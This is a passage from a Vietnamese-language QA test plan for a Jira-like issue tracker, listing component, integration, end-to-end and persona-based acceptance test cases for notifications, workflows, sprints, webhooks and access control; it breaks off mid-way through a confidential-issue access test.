- **Test Type:** Functional
- **Applied Technique:** State Transition
- **Priority:** `P2 (High)`
- **Preconditions:** Member có 5 thông báo chưa đọc (`read_at = NULL`).
- **Step-by-Step Procedure:**
  1. Gửi GET lấy danh sách thông báo.
  2. Gửi PATCH đánh dấu đã đọc thông báo thứ nhất.
  3. Gửi PATCH `/api/notifications/read-all` đánh dấu đã đọc tất cả.
- **Expected Results:**
  - Bước 1: HTTP `200 OK`, trả về danh sách 5 thông báo kèm số đếm `unreadCount: 5`.
  - Bước 2: HTTP `200 OK`, thông báo cập nhật `read_at = NOW()`, `unreadCount` giảm xuống 4.
  - Bước 3: HTTP `200 OK`, toàn bộ thông báo có `read_at` khác null, `unreadCount = 0`.

---

### `TC-NOTIF-002`: Cập nhật tùy chọn nhận thông báo cá nhân
- **Traceability:** `TB-REQ-61`, `TB-ERD-C26`
- **Target API Endpoint:** `PUT /api/notification-preferences`
- **Test Level:** Component Testing
- **Test Type:** Functional
- **Applied Technique:** Equivalence Partitioning
- **Priority:** `P3 (Medium)`
- **Test Data:** `{ "notificationType": "ISSUE_ASSIGNED", "channel": "email", "enabled": false }`.
- **Expected Results:**
  - HTTP `200 OK`. Bảng `notification_preferences` lưu cấu hình tắt email thông báo khi được gán việc.

---

## 1.16. Module Kiểm toán & Lịch sử Hoạt động (AuditController)

### `TC-AUD-001`: Truy vấn nhật ký kiểm toán hệ thống có phân trang và lọc phạm vi
- **Traceability:** `TB-REQ-44`, `REQ-AUD-02`, `TB-ERD-C23`
- **Target API Endpoint:** `GET /api/organizations/:orgId/audit`
- **Test Level:** System Testing
- **Test Type:** Functional & Security
- **Applied Technique:** Combinatorial Testing
- **Priority:** `P2 (High)`
- **Test Data:** `?projectId=CORE&actorMemberId=MEM_01&page=1&limit=50`.
- **Expected Results:**
  - HTTP `200 OK`. Trả về danh sách nhật ký `activity_logs` thỏa mãn điều kiện lọc.
  - Tuyệt đối không để rò rỉ bất kỳ log nào của Organization khác (bảo vệ đa tenant).

---

## 1.17. Module Tác vụ Nền & Đối soát Toàn vẹn (JobController)

### `TC-JOB-001`: Điều phối và theo dõi tiến độ Background Job
- **Traceability:** `TB-REQ-76`, `TB-BR-20`, `TB-ERD-C27`
- **Target API Endpoint:** `POST /api/jobs/export` & `GET /api/jobs/:jobId`
- **Test Level:** System Testing
- **Test Type:** Asynchronous / Integration
- **Applied Technique:** State Transition
- **Priority:** `P2 (High)`
- **Step-by-Step Procedure:**
  1. Gửi request yêu cầu xuất toàn bộ dữ liệu dự án ra file JSON.
  2. Lấy `jobId` và liên tục kiểm tra trạng thái job.
- **Expected Results:**
  - Bước 1: HTTP `202 Accepted`, trả về `{ "jobId": "UUID", "status": "queued" }`.
  - Bước 2: Trạng thái chuyển từ `queued` $\rightarrow$ `running` (kèm `progressCurrent` / `progressTotal`) $\rightarrow$ `succeeded` kèm `resultStorageKey` để tải file.

---

## 1.18. Module Khởi tạo Không gian Làm việc (WorkspaceController)

### `TC-WSP-001`: Nạp toàn diện dữ liệu ban đầu cho Single Page Application (Workspace Bootstrap)
- **Traceability:** `TB-REQ-79`, `TB-NFR-01`
- **Target API Endpoint:** `GET /api/workspace/bootstrap`
- **Test Level:** Integration Testing
- **Test Type:** Performance & Functional
- **Applied Technique:** Use Case Testing
- **Priority:** `P1 (Critical)`
- **Expected Results:**
  - HTTP `200 OK` với thời gian phản hồi $< 100\text{ms}$.
  - Trả về payload aggregate đầy đủ: Thông tin User, danh sách Tổ chức của user, Tổ chức hiện tại, danh sách Dự án, danh sách Quyền hạn, và số lượng thông báo chưa đọc.

---

# PHẦN 2: BỘ CA KIỂM THỬ TÍCH HỢP ĐA THÀNH PHẦN (COMPONENT INTEGRATION & SYSTEM INTEGRATION TESTING)

---

### `TC-CIT-001`: Tích hợp Controller $\rightarrow$ Service $\rightarrow$ TypeORM $\rightarrow$ PostgreSQL Transaction Rollback
- **Traceability:** `TB-BR-08`, `TB-NFR-04`
- **Test Level:** Component Integration Testing (CIT)
- **Test Type:** Reliability & Transaction Integrity
- **Applied Technique:** Error Guessing / Fault Injection
- **Priority:** `P1 (Critical)`
- **Scenario:** Trong phương thức `IssueService.transition`, sau khi cập nhật `issues` thành công, giả lập lỗi crash ở bước lưu `issue_state_history`.
- **Step-by-Step Procedure:**
  1. Inject lỗi giả lập trong transaction.
  2. Kiểm tra CSDL bảng `issues`.
- **Expected Results:**
  - Toàn bộ Database Transaction tự động Rollback.
  - Trạng thái `issues.state_id` và `issues.version` không bị thay đổi dở dang, đảm bảo tính toàn vẹn ACID.

---

### `TC-CIT-002`: Tích hợp FSM Engine + Transition Guards + Scheme Permissions (Deny Overrides Allow)
- **Traceability:** `TB-REQ-34`, `TB-REQ-35`, `TB-BR-06`, `TB-ERD-C03`, `TB-ERD-C10`
- **Test Level:** Component Integration Testing (CIT)
- **Test Type:** Business Rule & State Machine
- **Applied Technique:** Decision Table & State Transition
- **Priority:** `P1 (Critical)`
- **Scenario:** Issue đang ở `In Review`. Transition sang `Done` có Guard `requires_fields: ["resolutionId"]`. Member gọi API vừa thuộc Role Developer (Allow) vừa thuộc Role Trainee (Deny).
- **Step-by-Step Procedure:**
  1. Gửi request transition không truyền resolution $\rightarrow$ Kiểm tra lỗi Guard.
  2. Gửi request transition có resolution nhưng User vẫn thuộc Role Trainee (Deny) $\rightarrow$ Kiểm tra lỗi Phân quyền.
  3. Gỡ User khỏi Role Trainee và gọi lại.
- **Expected Results:**
  - Bước 1: HTTP `422 Unprocessable Entity` do Transition Guard chặn.
  - Bước 2: HTTP `403 Forbidden` do nguyên tắc `TB-BR-06` Deny-overrides-allow chặn.
  - Bước 3: HTTP `200 OK`, chuyển sang `Done`, cập nhật `resolved_at = NOW()` và ghi vết vào `issue_state_history`.

---

### `TC-CIT-003`: Tích hợp Dynamic Custom Field Engine & Context Typing (Schema Validation)
- **Traceability:** `TB-REQ-46`, `TB-REQ-47`, `TB-ERD-C09`, `TB-ERD-C21`, `TB-ERD-C22`
- **Test Level:** Component Integration Testing (CIT)
- **Test Type:** Data Integrity & Validation
- **Applied Technique:** Equivalence Partitioning & Boundary Value
- **Priority:** `P2 (High)`
- **Scenario:** Trường `STORY_POINTS` (kiểu `number`) và `ENV` (kiểu `select` có options: DEV, STAGING).
- **Step-by-Step Procedure:**
  1. Tạo issue với Custom Field `STORY_POINTS = "invalid_string"`.
  2. Tạo issue với Custom Field `ENV = "PRODUCTION"` (option không có trong danh mục).
  3. Tạo issue với Custom Field `STORY_POINTS = 8` và `ENV = "STAGING"`.
- **Expected Results:**
  - Bước 1 & 2: Bị từ chối HTTP `422 Unprocessable Entity` theo Invariant `C-22`.
  - Bước 3: HTTP `201 Created`. Bảng `issue_custom_field_values` lưu cấu trúc JSON hợp lệ.

---

### `TC-CIT-004`: Tích hợp Sắp xếp Board đa Cột qua Lexorank & State Mapping
- **Traceability:** `TB-REQ-25`, `TB-REQ-26`, `TB-ERD-C04`, `TB-ERD-C18`, `TB-ERD-C19`
- **Test Level:** Component Integration Testing (CIT)
- **Test Type:** Functional / Concurrency
- **Applied Technique:** Boundary Value Analysis
- **Priority:** `P1 (Critical)`
- **Scenario:** Kéo thả card giữa các cột có nhiều state map vào cùng 1 cột.
- **Step-by-Step Procedure:**
  1. Kéo Issue từ Cột 1 sang Cột 2 (cột chứa 2 state: `Code Review` và `QA Testing`).
  2. Kéo chen Issue vào giữa 2 card đã có sẵn trên board.
- **Expected Results:**
  - Bước 1: Issue tự động nhận default state của cột hoặc kích hoạt modal chọn state đích.
  - Bước 2: Giá trị `rank` trong `board_issue_positions` được tính toán chính xác nằm giữa 2 card kề cận theo chuẩn Lexorank; không ảnh hưởng tới bảng khác.

---

### `TC-CIT-005`: Tích hợp Bình luận Đa cấp & Thuật toán Cycle Detection
- **Traceability:** `TB-REQ-38`, `TB-ERD-C14`
- **Test Level:** Component Integration Testing (CIT)
- **Test Type:** Structural & Integrity
- **Applied Technique:** Fault Injection / Cycle Testing
- **Priority:** `P2 (High)`
- **Scenario:** Bình luận C1 là cha của C2, C2 là cha của C3.
- **Step-by-Step Procedure:**
  1. Gửi request cập nhật bình luận C1 đặt `parentCommentId = C3.id` (tạo chu trình kín 3 cấp).
- **Expected Results:**
  - HTTP `422 Unprocessable Entity`. Thuật toán Cycle Detector phát hiện chu trình đệ quy và chặn cập nhật, bảo toàn cấu trúc cây bình luận.

---

### `TC-CIT-006`: Tích hợp Liên kết Issue Canonical & Chặn Self-Link
- **Traceability:** `TB-REQ-41`, `TB-BR-09`, `TB-ERD-C06`, `TB-ERD-C07`
- **Test Level:** Component Integration Testing (CIT)
- **Test Type:** Data Integrity & Negative
- **Applied Technique:** Boundary Value / Error Guessing
- **Priority:** `P1 (Critical)`
- **Step-by-Step Procedure:**
  1. Thử tạo liên kết giữa Issue A và chính Issue A $\rightarrow$ Kiểm tra chặn self-link.
  2. Tạo liên kết Symmetric "Relates To" giữa Issue UUID `9999...` và `1111...`.
- **Expected Results:**
  - Bước 1: HTTP `409 Conflict` vi phạm Check Constraint `TB-BR-09`.
  - Bước 2: HTTP `201 Created`. Bảng `issue_links` lưu cặp ID theo thứ tự chuẩn tắc `(1111..., 9999...)` theo Invariant `C-07`.

---

### `TC-SIT-001`: Tích hợp Bất đồng bộ: API Transaction $\rightarrow$ Outbox Table $\rightarrow$ Worker Engine $\rightarrow$ Notification Dispatch
- **Traceability:** `TB-REQ-36`, `TB-REQ-59`, `TB-BR-08`, `TB-NFR-03`
- **Test Level:** System Integration Testing (SIT)
- **Test Type:** Event-Driven / Integration
- **Applied Technique:** State Transition
- **Priority:** `P1 (Critical)`
- **Scenario:** Chuyển trạng thái Issue sang `Done`.
- **Step-by-Step Procedure:**
  1. Client gọi API Transition Issue.
  2. Kiểm tra bảng `outbox_events` có bản ghi `status = 'pending'`.
  3. Worker Process khởi chạy chu kỳ quét sự kiện.
  4. Kiểm tra bảng `notifications` của Assignee và Reporter.
  5. Kiểm tra bảng `outbox_events` cập nhật `status = 'published'`.
- **Expected Results:**
  - Sự kiện Outbox được sinh cùng transaction với nghiệp vụ.
  - Worker quét thành công, tạo thông báo in-app cho người liên quan và đánh dấu sự kiện đã phát (At-Least-Once Delivery).

---

### `TC-SIT-002`: Tích hợp Worker $\rightarrow$ Webhook Delivery với Cơ chế Retry lũy thừa
- **Traceability:** `TB-REQ-62`, `TB-REQ-64`, `TB-NFR-03`
- **Test Level:** System Integration Testing (SIT)
- **Test Type:** Reliability / Integration
- **Applied Technique:** Fault Injection / Retry Testing
- **Priority:** `P2 (High)`
- **Scenario:** Webhook URL của bên thứ ba tạm thời mất kết nối mạng (trả về HTTP 503).
- **Step-by-Step Procedure:**
  1. Sự kiện Issue Created kích hoạt gửi Webhook.
  2. Mock server trả về lỗi `503 Service Unavailable`.
  3. Quan sát lịch trình retry của Worker.
- **Expected Results:**
  - Worker không hủy bỏ sự kiện ngay mà ghi nhận `attempt = 1`.
  - Thực hiện retry lần 2 sau 5 giây, lần 3 sau 25 giây (Exponential Backoff).
  - Ghi nhận đầy đủ lịch sử trong `webhook_deliveries`.

---

### `TC-SIT-003`: Tích hợp Background Job Engine & Distributed Leases (Khóa phân tán & Heartbeat)
- **Traceability:** `TB-REQ-76`, `TB-BR-20`, `TB-ERD-C27`
- **Test Level:** System Integration Testing (SIT)
- **Test Type:** Asynchronous / Resilience
- **Applied Technique:** Fault Injection / Concurrency
- **Priority:** `P1 (Critical)`
- **Scenario:** Worker 1 đang chạy job export dữ liệu thì bị kill đột ngột (crash).
- **Step-by-Step Procedure:**
  1. Khởi chạy job export, Worker 1 giữ lease (`lease_owner = 'worker-1'`, `lease_expires_at = NOW() + 30s`).
  2. Kill tiến trình Worker 1.
  3. Chờ 31 giây để lease hết hạn.
  4. Khởi chạy Worker 2.
- **Expected Results:**
  - Worker 2 phát hiện job quá hạn lease (`lease_expires_at < NOW()`) và trạng thái vẫn `running`.
  - Worker 2 thu hồi lease (`lease_owner = 'worker-2'`), tiếp tục hoàn tất job xuất file an toàn (`succeeded`).

---

### `TC-SIT-004`: Tích hợp Phân phối Thông báo Đa kênh & Preferences Filtering
- **Traceability:** `TB-REQ-60`, `TB-REQ-61`, `TB-ERD-C24`, `TB-ERD-C26`
- **Test Level:** System Integration Testing (SIT)
- **Test Type:** Event-Driven / Integration
- **Applied Technique:** Decision Table
- **Priority:** `P2 (High)`
- **Scenario:** User A tắt email notification cho sự kiện `ISSUE_ASSIGNED`; User B bật cả in-app và email.
- **Step-by-Step Procedure:**
  1. Gán User A và User B vào 2 issue khác nhau.
  2. Worker nhặt Outbox Event và phân phối thông báo.
- **Expected Results:**
  - User A: Có bản ghi trong `notifications` (in-app), **không có** bản ghi trong `notification_deliveries` (email).
  - User B: Có cả 2 bản ghi trong `notifications` và `notification_deliveries` (`status = 'sent'`).

---

# PHẦN 3: BỘ CA KIỂM THỬ HỆ THỐNG ĐẦU CUỐI (SYSTEM END-TO-END WORKFLOWS)

---

### `TC-E2E-001`: Luồng Quản trị Thiết lập Hoàn chỉnh (From Zero to Agile Workspace)
- **Traceability:** `TB-REQ-01`, `TB-REQ-08`, `TB-REQ-09`, `TB-REQ-16`, `TB-REQ-23`, `TB-REQ-32`
- **Test Level:** System Testing (E2E)
- **Test Type:** End-to-End Business Flow
- **Applied Technique:** Use Case Testing
- **Priority:** `P1 (Critical)`
- **Luồng thực thi tuần tự:**
  1. **Bước 1 (Đăng ký Admin):** Guest đăng ký tài khoản `ceo@enterprise.dev`.
  2. **Bước 2 (Khởi tạo Org):** Đăng nhập và tạo Organization `ENTERPRISE` gói `enterprise`.
  3. **Bước 3 (Mời Nhân viên):** Gửi lời mời tới `dev.lead@enterprise.dev` với vai trò Member.
  4. **Bước 4 (Chấp nhận Lời mời):** `dev.lead` kích hoạt tài khoản và gia nhập Org.
  5. **Bước 5 (Tạo Dự án):** Tạo Project `CORE` với key `CORE`.
  6. **Bước 6 (Cấu hình Workflow):** Tạo Workflow chuẩn: `To Do` $\rightarrow$ `In Progress` $\rightarrow$ `Code Review` $\rightarrow$ `Done`.
  7. **Bước 7 (Cấu hình Bảng Scrum):** Tạo Scrum Board và map các trạng thái vào 4 cột tương ứng.
  8. **Bước 8 (Thêm Member vào Project):** Gán vai trò Developer cho `dev.lead`.
- **Expected Results:**
  - 100% các bước đều hoàn thành với HTTP 200/201.
  - Dự án sẵn sàng để lập kế hoạch Sprint và phân chia công việc.

---

### `TC-E2E-002`: Chu kỳ Phát triển Sprint Toàn diện (Full Scrum Sprint Development Cycle)
- **Traceability:** `TB-REQ-27`, `TB-REQ-28`, `TB-REQ-29`, `TB-REQ-31`, `TB-REQ-36`, `TB-REQ-40`
- **Test Level:** System Testing (E2E)
- **Test Type:** End-to-End Business Flow
- **Applied Technique:** Use Case Testing
- **Priority:** `P1 (Critical)`
- **Luồng thực thi tuần tự:**
  1. **Bước 1 (Lập Backlog):** Tạo 5 Issue (`CORE-1` đến `CORE-5`) với các Story Points tương ứng: 3, 5, 8, 2, 5.
  2. **Bước 2 (Tạo Sprint):** Tạo `Sprint 1` trên Scrum Board.
  3. **Bước 3 (Gán việc vào Sprint):** Kéo thả cả 5 issue từ Backlog vào `Sprint 1`. Tổng points = 23.
  4. **Bước 4 (Kích hoạt Sprint):** Scrum Master bấm `Start Sprint`. Trạng thái chuyển `active`.
  5. **Bước 5 (Triển khai công việc):**
     - Developer chuyển `CORE-1` từ `To Do` $\rightarrow$ `In Progress`.
     - Developer ghi nhận 4 giờ Work Log trên `CORE-1`.
     - Developer chuyển `CORE-1` $\rightarrow$ `Code Review` $\rightarrow$ `Done` (Gán resolution `Fixed`).
  6. **Bước 6 (Đóng Sprint):** Đến ngày kết thúc, `CORE-1` đã Done; `CORE-2..5` vẫn đang dở dang.
  7. **Bước 7 (Hoàn thành Sprint):** Bấm `Close Sprint` chọn di chuyển việc dở dang về Backlog.
- **Expected Results:**
  - `Sprint 1` chuyển sang `closed`.
  - `CORE-1` vẫn lưu thuộc `Sprint 1`.
  - `CORE-2..5` quay trở lại Backlog để lập kế hoạch cho Sprint 2.
  - Báo cáo Velocity ghi nhận 3 points hoàn thành cho `Sprint 1`.

---

### `TC-E2E-003`: Chu kỳ Vòng đời Toàn diện của Issue Phức hợp (Full Issue Aggregate Lifecycle)
- **Traceability:** `TB-REQ-31`, `TB-REQ-38`, `TB-REQ-39`, `TB-REQ-40`, `TB-REQ-41`, `TB-REQ-70`
- **Test Level:** System Testing (E2E)
- **Test Type:** End-to-End Business Flow
- **Applied Technique:** Use Case Testing
- **Priority:** `P1 (Critical)`
- **Luồng thực thi tuần tự:**
  1. Tạo Issue cha kiểu Story kèm Custom Field `Business Value = 100`.
  2. Tạo 2 Sub-task con thuộc Story này.
  3. Tạo Issue Bug độc lập và liên kết `Bug blocks Story`.
  4. Đính kèm tài liệu phân tích nghiệp vụ (PDF 2MB) vào Story.
  5. Thảo luận và trao đổi giải pháp qua 3 cấp bình luận (Nested Comments).
  6. Developer ghi nhận 5 giờ làm việc (Work Log).
  7. Giải quyết Bug $\rightarrow$ Chuyển Bug sang Done $\rightarrow$ Transition Story qua Code Review $\rightarrow$ Done.
- **Expected Results:**
  - Toàn bộ liên kết, subtasks, worklog, comments và attachment hiển thị đầy đủ trên màn hình chi tiết Issue.
  - Số giờ còn lại tự động giảm trừ chính xác; trạng thái resolution được ghi nhận nhất quán.

---

### `TC-E2E-004`: Nâng cấp & Di chuyển Sơ đồ Quy trình Dự án (Workflow Scheme Migration)
- **Traceability:** `TB-REQ-33`, `TB-REQ-76`, `TB-ERD-C12`
- **Test Level:** System Testing (E2E)
- **Test Type:** Data Migration & Workflow
- **Applied Technique:** State Transition & Equivalence
- **Priority:** `P1 (Critical)`
- **Luồng thực thi tuần tự:**
  1. Dự án Alpha đang có 20 Issue ở trạng thái `QA Testing` thuộc Workflow V1.
  2. Admin cấu hình Workflow V2 thay thế `QA Testing` bằng trạng thái `User Verification`.
  3. Admin gán Workflow Scheme mới cho Dự án Alpha $\rightarrow$ Hệ thống kích hoạt màn hình Preview Migration.
  4. Admin xác nhận map `QA Testing` $\rightarrow$ `User Verification` và bấm thực thi migration.
  5. Background Job chạy ngầm chuyển dịch toàn bộ 20 issue sang trạng thái mới.
- **Expected Results:**
  - 20 Issue được cập nhật sang `User Verification` an toàn.
  - Bảng `issue_state_history` ghi nhận sự kiện chuyển đổi do migration job thực hiện. Không có issue nào bị rơi vào trạng thái orphan.

---

### `TC-E2E-005`: Vòng đời Tự động hóa Khép kín (End-to-End Automation Engine Flow)
- **Traceability:** `TB-REQ-56`, `TB-REQ-57`, `TB-REQ-58`, `TB-ERD-C46`
- **Test Level:** System Testing (E2E)
- **Test Type:** Event-Driven / Automation
- **Applied Technique:** Decision Table
- **Priority:** `P1 (Critical)`
- **Luồng thực thi tuần tự:**
  1. Admin tạo Automation Rule: Trigger `ISSUE_CREATED`, Condition `priority == 'Highest'`, Action: `AUTO_ASSIGN_TO_LEAD` + `ADD_LABEL('urgent')` + `SEND_WEBHOOK`.
  2. User tạo một Issue mới với độ ưu tiên Highest.
  3. Transaction tạo issue commit thành công, phát sinh Outbox Event.
  4. Worker quét sự kiện, nạp cây component rule và thực thi các actions.
- **Expected Results:**
  - Issue tự động được gán cho Component Lead.
  - Nhãn `urgent` tự động xuất hiện trên Issue.
  - Mock Webhook nhận được HTTP POST payload thông báo.
  - Bảng `automation_executions` ghi nhận trạng thái `succeeded` kèm thời gian thực thi $< 200\text{ms}$.

---

### `TC-E2E-006`: Chuỗi Lập kế hoạch Tìm kiếm, Bảng điều khiển & Đăng ký Báo cáo
- **Traceability:** `TB-REQ-51`, `TB-REQ-52`, `TB-REQ-53`, `TB-REQ-65`, `TB-ERD-C44`, `TB-ERD-C47`
- **Test Level:** System Testing (E2E)
- **Test Type:** Productivity & Reporting
- **Applied Technique:** Use Case Testing
- **Priority:** `P2 (High)`
- **Luồng thực thi tuần tự:**
  1. Member viết câu query tìm kiếm các Issue đang mở thuộc dự án Core có priority High.
  2. Lưu kết quả tìm kiếm thành `saved_filters` tên là "Core Critical Issues".
  3. Chia sẻ filter cho toàn bộ thành viên trong Project Core.
  4. Tạo Dashboard mới, thêm Widget Pie Chart lấy dữ liệu từ Saved Filter vừa tạo.
  5. Tạo Filter Subscription gửi email kết quả vào 8:00 sáng mỗi ngày.
  6. Kích hoạt trigger worker chạy subscription giả lập.
- **Expected Results:**
  - Dashboard hiển thị biểu đồ thống kê chính xác số lượng issue theo trạng thái.
  - Email báo cáo được gửi tới hòm thư của subscriber với danh sách issue đầy đủ.

---

### `TC-E2E-007`: Quản trị Nhân sự, Tái cấu trúc Phòng ban & Đóng tài khoản (Offboarding)
- **Traceability:** `TB-REQ-11`, `TB-REQ-13`, `TB-REQ-15`, `TB-BR-12`, `TB-BR-19`
- **Test Level:** System Testing (E2E)
- **Test Type:** Security & Governance
- **Applied Technique:** State Transition
- **Priority:** `P1 (Critical)`
- **Luồng thực thi tuần tự:**
  1. Chuyển phòng ban của Developer B sang phòng ban mới (xác minh kiểm tra cycle detection thành công).
  2. Admin đình chỉ (`suspended`) tài khoản Developer B.
  3. Developer B cố tình gọi API lấy dữ liệu dự án $\rightarrow$ Bị chặn `403 Forbidden`.
  4. Bàn giao toàn bộ Issue mà Developer B đang được gán cho Developer C.
  5. Thử nghiệm Org Admin duy nhất tự bấm rời khỏi tổ chức $\rightarrow$ Xác minh hệ thống chặn theo invariant `TB-BR-12`.
- **Expected Results:**
  - Toàn bộ phiên đăng nhập của Developer B bị thu hồi tức thì.
  - Dữ liệu công việc được chuyển giao sạch sẽ; tổ chức luôn có ít nhất 1 Admin bảo hộ.

---

### `TC-E2E-008`: Tích hợp CI/CD Bên ngoài thông qua Personal Access Token (PAT) & Webhook
- **Traceability:** `TB-REQ-62`, `TB-REQ-63`, `TB-REQ-76`
- **Test Level:** System Testing (E2E)
- **Test Type:** Integration & Security
- **Applied Technique:** Use Case Testing
- **Priority:** `P1 (Critical)`
- **Luồng thực thi tuần tự:**
  1. Developer tạo mã PAT trong trang cá nhân, chọn thời hạn 30 ngày và scope `issues:write`.
  2. Sao chép raw token được hiển thị duy nhất 1 lần.
  3. Giả lập CI/CD Runner dùng token này gửi HTTP POST tạo Issue tự động khi unit test thất bại.
  4. Hệ thống tạo Issue thành công, kích hoạt Webhook bắn ngược sự kiện về server build.
- **Expected Results:**
  - Issue được tạo chính xác với tác nhân là Developer sở hữu PAT.
  - Webhook gửi payload có chữ ký HMAC-SHA256 hợp lệ sang CI/CD server.

---

# PHẦN 4: BỘ CA KIỂM THỬ NGHIỆM THU NGƯỜI DÙNG ĐA TÁC NHÂN (UAT USER PERSONAS)

---

### `TC-UAT-001`: Persona Developer — Quản lý công việc cá nhân, Kéo thả Board & Báo cáo tiến độ
- **Traceability:** `TB-REQ-31`, `TB-REQ-26`, `TB-REQ-40`, `TB-REQ-38`
- **Actor:** Developer (Nguyễn Văn Dev)
- **Test Level:** User Acceptance Testing (UAT)
- **Test Type:** Usability & Functional
- **Applied Technique:** Persona Testing / Exploratory
- **Kịch bản Nghiệm thu:**
  1. Đăng nhập vào hệ thống, truy cập màn hình **My Work**.
  2. Xem danh sách các công việc được giao cho mình trong Sprint hiện tại.
  3. Mở Agile Board, thực hiện thao tác kéo thả Issue card từ cột **In Progress** sang cột **Code Review**.
  4. Mở modal chi tiết Issue, viết bình luận tóm tắt Pull Request link.
  5. Ghi nhận 3.5 giờ làm việc vào mục **Log Work**.
  6. Kiểm tra số giờ còn lại (Remaining Estimate) tự động giảm đi 3.5 giờ.
- **Tiêu chuẩn Nghiệm thu (Acceptance Criteria):**
  - Giao diện phản hồi kéo thả mượt mà dưới 100ms, không bị giật lag.
  - Trạng thái và vị trí card được lưu tức thì vào CSDL.
  - Bình luận và worklog hiển thị ngay lập tức không cần F5 tải lại trang.

---

### `TC-UAT-002`: Persona Scrum Master — Theo dõi tiến độ Sprint & Biểu đồ Burndown Chart
- **Traceability:** `TB-REQ-30`, `TB-REQ-24`, `TB-REQ-55`
- **Actor:** Scrum Master (Trần Thị Scrum Master)
- **Test Level:** User Acceptance Testing (UAT)
- **Test Type:** Usability & Reporting
- **Applied Technique:** Persona Testing
- **Kịch bản Nghiệm thu:**
  1. Truy cập Scrum Board, quan sát thanh trạng thái Sprint (số ngày còn lại, tổng số Story Points).
  2. Kiểm tra cảnh báo cột **In Progress** khi các Developer kéo quá 5 card vào cột (WIP Limit = 4).
  3. Mở tab **Reports** $\rightarrow$ xem biểu đồ **Sprint Burndown Chart**.
  4. Đánh giá đường thực tế (Actual guideline) so với đường lý tưởng (Ideal guideline).
- **Tiêu chuẩn Nghiệm thu (Acceptance Criteria):**
  - Cảnh báo WIP Limit hiển thị màu đỏ rõ ràng, trực quan.
  - Biểu đồ Burndown Chart hiển thị chính xác các mốc hoàn thành công việc theo từng ngày của Sprint.

---

### `TC-UAT-003`: Persona Organization Admin — Quản trị Tenant, Gói cước, Lời mời & Phòng ban
- **Traceability:** `TB-REQ-08`, `TB-REQ-09`, `TB-REQ-11`, `TB-REQ-13`, `TB-REQ-64`
- **Actor:** Organization Admin (Lê Quản Trị)
- **Test Level:** User Acceptance Testing (UAT)
- **Test Type:** Governance & Usability
- **Applied Technique:** Persona Testing
- **Kịch bản Nghiệm thu:**
  1. Mở màn hình **Organization Settings**.
  2. Xem danh sách thành viên, kiểm tra danh sách lời mời đang chờ (`pending`).
  3. Thực hiện gửi lại lời mời (Resend Invite) cho một thành viên bị thất lạc email.
  4. Tạo phòng ban mới "Mobile Core Team" trực thuộc phòng ban "Engineering".
  5. Kiểm tra thông tin gói dịch vụ hiện tại (Enterprise) và hạn mức tài nguyên đã sử dụng.
- **Tiêu chuẩn Nghiệm thu (Acceptance Criteria):**
  - Giao diện quản trị hiển thị trực quan, phân tách tab rõ ràng.
  - Thao tác gửi lại lời mời tạo token mới và cập nhật thời gian hết hạn tức thì.

---

### `TC-UAT-004`: Persona Project Lead — Cấu hình Dự án, Components, Releases & Schemes
- **Traceability:** `TB-REQ-16`, `TB-REQ-20`, `TB-REQ-21`, `TB-REQ-33`
- **Actor:** Project Lead (Phạm Trưởng Dự Án)
- **Test Level:** User Acceptance Testing (UAT)
- **Test Type:** Project Administration
- **Applied Technique:** Persona Testing
- **Kịch bản Nghiệm thu:**
  1. Truy cập màn hình **Project Settings**.
  2. Tạo Cấu phần mới "Authentication Service" và chỉ định Lead Component.
  3. Tạo Phiên bản phát hành mới "v2.1.0-RC1" với ngày phát hành dự kiến.
  4. Rà soát sơ đồ quy trình (Workflow Scheme) và sơ đồ phân quyền đang áp dụng cho dự án.
- **Tiêu chuẩn Nghiệm thu (Acceptance Criteria):**
  - Project Lead cấu hình dự án độc lập, không ảnh hưởng tới các dự án khác trong cùng tổ chức.

---

### `TC-UAT-005`: Persona QA Tester — Báo cáo Bug, Gắn nhãn, Blocks link, Watchers & Verify Close
- **Traceability:** `TB-REQ-31`, `TB-REQ-39`, `TB-REQ-41`, `TB-REQ-42`, `TB-REQ-43`
- **Actor:** QA Engineer (Vũ Kiểm Thử)
- **Test Level:** User Acceptance Testing (UAT)
- **Test Type:** Defect Lifecycle & Collaboration
- **Applied Technique:** Persona Testing
- **Kịch bản Nghiệm thu:**
  1. Mở modal **Create Issue**, chọn loại Issue là `Bug`.
  2. Nhập tiêu đề, các bước tái hiện, đính kèm ảnh chụp lỗi màn hình (PNG 1.2MB).
  3. Gắn nhãn `regression`, `payment_gateway`.
  4. Tạo liên kết công việc: Chọn loại `Blocks` trỏ tới User Story đang phát triển.
  5. Bấm theo dõi Issue (Watch) để nhận thông báo khi Developer sửa lỗi.
  6. Sau khi Developer chuyển sang Done, QA kiểm tra lại trên môi trường staging và đóng bug.
- **Tiêu chuẩn Nghiệm thu (Acceptance Criteria):**
  - Tải file nhanh chóng, xem trước ảnh ngay trong modal.
  - Quan hệ liên kết hiển thị hai chiều rõ ràng trên cả 2 issue.

---

### `TC-UAT-006`: Persona Product Owner — Quản lý Backlog, Lexorank, Hierarchy & Velocity
- **Traceability:** `TB-REQ-26`, `TB-REQ-27`, `TB-REQ-70`, `TB-REQ-30`
- **Actor:** Product Owner (Đỗ Sản Phẩm)
- **Test Level:** User Acceptance Testing (UAT)
- **Test Type:** Agile Backlog Management
- **Applied Technique:** Persona Testing
- **Kịch bản Nghiệm thu:**
  1. Truy cập màn hình **Project Backlog**.
  2. Xem danh sách các Epic và phân rã thành các User Story con.
  3. Kéo thả các User Story để sắp xếp lại thứ tự ưu tiên trên Backlog theo thuật toán Lexorank.
  4. Tạo Sprint mới và kéo thả các Story có độ ưu tiên cao nhất vào Sprint.
  5. Xem báo cáo **Velocity Chart** để đánh giá năng lực hoàn thành công việc của đội ngũ qua 3 sprint gần nhất.
- **Tiêu chuẩn Nghiệm thu (Acceptance Criteria):**
  - Kéo thả mượt mà trên danh sách hàng trăm items; thứ tự ưu tiên lưu chuẩn xác.

---

### `TC-UAT-007`: Persona Restricted Viewer — Kiểm định Bảo mật Cấp Issue (Confidential Filter)
- **Traceability:** `TB-REQ-48`, `TB-REQ-49`, `TB-REQ-50`, `TB-BR-16`
- **Actor:** Restricted Viewer / External Partner (Khách hàng Bên ngoài)
- **Test Level:** User Acceptance Testing (UAT)
- **Test Type:** Security & Confidentiality
- **Applied Technique:** Negative / Persona Testing
- **Kịch bản Nghiệm thu:**
  1. Đăng nhập tài khoản Viewer, truy cập dự án Alpha.
  2. Mở Kanban Board và Backlog: Quan sát danh sách các issue hiển thị.
  3. Sử dụng thanh tìm kiếm gõ mã số của một Issue mật (`ISSUE-SECRET-99` có mức bảo mật "Confidential").
  4. Cố tình nhập trực tiếp URL `/issues/ISSUE-SECRET-99` trên trình duyệt.
